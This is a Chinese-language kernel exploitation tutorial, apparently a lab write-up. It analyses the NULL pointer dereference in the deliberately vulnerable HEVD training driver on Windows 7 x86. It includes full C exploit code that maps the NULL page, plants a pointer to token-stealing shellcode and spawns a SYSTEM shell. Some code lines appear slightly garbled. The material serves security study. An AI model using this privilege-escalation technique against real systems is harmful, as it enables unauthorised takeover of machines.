## **前言**

窥探Ring0漏洞世界：空指针解引用漏洞，这是一个比较简单好理解的漏洞。

首先，什么是解引用？大概就是把指针指向的地址的数据取出来。

那么，空指针解引用，则就是把NULL页面地址的内容取出来，一般这么操作会报错0xC0000005内存访问违例，但是如果能控制NULL页面，则会使得对空指针解引用有一定的操作空间。

当指针指向NULL时，就可能存在空指针解引用漏洞，这里我们将使用与上一节相同的技术来分配NULL页面，完成对空指针解引用漏洞的利用。

实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

##  **漏洞分析**

本次实验内容是NullPointerDereference，IRP分发函数通过跳转表进行跳转，使用的控制码是：0x22202b，该示例调用：NullPointerDereferenceIoctlHandler->TriggerNullPointerDereference，漏洞分析。

函数一开始先申请了8字节非分页内存，标签是kcaH。

![](https://image.3001.net/images/20220715/1657889383_62d162673e16c859ce4e9.png!small)

然后接下来，从用户传入的指针里取值，判断取出的值是否为一个固定的数字0BAD0B0B0h，如果是的话就把该值保存到edi地址里，然后往偏移4的位置保存一个函数指针，这个edi保存的是刚刚申请的内存首地址；

![](https://image.3001.net/images/20220715/1657889384_62d162680d22c0924732b.png!small)

如果取出来的值比对不成功，则释放刚刚申请的内存。

![](https://image.3001.net/images/20220715/1657889385_62d16269133aa5f16f4e1.png!small)

然后之后就是，把保存在申请内存偏移4的位置的函数指针取出来，判断是不是刚刚存入的函数，如果是就执行该函数，如果不是就call
eax，eax的值就是偏移4位置存储的函数指针。

![](https://image.3001.net/images/20220715/1657889385_62d16269c874ff81877cd.png!small)

到这里这个函数差不多就结束了，整体流程是先申请了内存，如果用户参数合理就保存一个函数到内存里，然后调用，如果不合理就释放内存，然后判断申请的内存指针里存的内容，如果是指定内容就调用指定函数，如果不是也直接调用。

这里存在的问题是，判断失败之后没有直接返回，反而跟着判断成功的逻辑继续执行，从而导致漏洞

只需要往0地址偏移4的位置写上4字节shellcode地址，即可完成执行。

##  **漏洞利用**

利用思路就很简单了：

使用上一篇HEVD池溢出相同的方法，进行0地址映射，这里只需要输入一个错误的4字节，就会进入漏洞触发区域，就会去执行0+4地址的函数地址，这里只需要去这个位置提前写好shellcode地址即可完成利用，利用代码如下：

    
    
    #include
    #include
    #include
    typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(IN HANDLEProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG      ZeroBits,
    IN OUT PULONG AllocationSize,
    IN ULONG      AllocationType,
    IN ULONG      Protect);
    
    // Windows 7 SP1 x86 Offsets
    #define KTHREAD_OFFSET     0x124 // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050 // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4 // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8 // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004 // SYSTEM Process PID
    
    VOID TokenStealingPayloadWin7() {
    // Importance of Kernel Recovery
    __asm {
    pushad
    
    ;获取当前进程EPROCESS
    xor eax, eax
    mov eax, fs: [eax + KTHREAD_OFFSET]
    mov eax, [eax + EPROCESS_OFFSET]
    mov ecx, eax
    
    ;搜索system进程EPROCESS
    mov edx, SYSTEM_PID
    SearchSystemPID :
    mov eax, [eax + FLINK_OFFSET]
         sub eax, FLINK_OFFSET
    cmp[eax + PID_OFFSET], edx
    jne SearchSystemPID
    
    token窃取
    mov edx, [eax + TOKEN_OFFSET]
    mov[ecx + TOKEN_OFFSET], edx
    
    环境还原 + 返回
    popad
       ret
    }
    }
    
    BOOL MapNullPage() {
    HMODULE hNtdll;
    SIZE_T RegionSize = 0x1000;           // will be rounded up to the next host
    // page size address boundary -> 0x2000
    PVOID BaseAddress = (PVOID)0x00000001; // will be rounded down to the next host
    // page size address boundary -> 0x00000000
    hNtdll = GetModuleHandle(L"ntdll.dll");
    
    // Grab the address of NtAllocateVirtualMemory
    NtAllocateVirtualMemory_t    NtAllocateVirtualMemory;
    NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    
    // Allocate the Virtual memory
    NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
    &BaseAddress,
      0,
    &RegionSize,
    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE);
    
    FreeLibrary(hNtdll);
    return TRUE;
    }
    
    int main()
    {
    ULONG UserBufferSize = 0x4;
    PVOID EopPayload = &ampTokenStealingPayloadWin7
    char* UserBuffer = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, UserBufferSize);
    RtlFillMemory(UserBuffer, UserBufferSize, 'A');
    
    HANDLE hDevice = ::CreateFileW(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    
    // 设置指针
    MapNullPage();
    *(PULONG)0x00000004 = (ULONG)EopPayload;
    
    ULONG WriteRet = 0;
    DeviceIoControl(hDevice, 0x22202b, (LPVOID)UserBuffer, UserBufferSize, NULL, 0, &WriteRet, NULL);
    
    HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);
    UserBuffer = NULL;
    
    system("pause");
    system("cmd.exe");
    
    return 0;
    }

  

##  **效果截图**

![](https://image.3001.net/images/20220715/1657889386_62d1626a69d69dac9debf.png!small)

##  **参考资料**

•[1] Windows Kernel Exploitation Tutorial Part 5: NULL Pointer Dereference -rootkit (rootkits.xyz) https://rootkits.xyz/blog/2018/01/kernel-null-pointer-dereference/

•[2] 解引用_百度百科(baidu.com)
https://baike.baidu.com/item/%E8%A7%A3%E5%BC%95%E7%94%A8/5534514

•[3] 指针()、取地址(&)、解引用()与引用(&)_Adenialzz的博客-CSDN博客_地址解引用https://blog.csdn.net/weixin_44966641/article/details/118939975

•[4] 简析CWE-476：NULL Pointer Dereference空指针解引用漏洞\- 中科天齐软件原生安全\-博客园(cnblogs.com) https://www.cnblogs.com/zktq/p/14921850.html

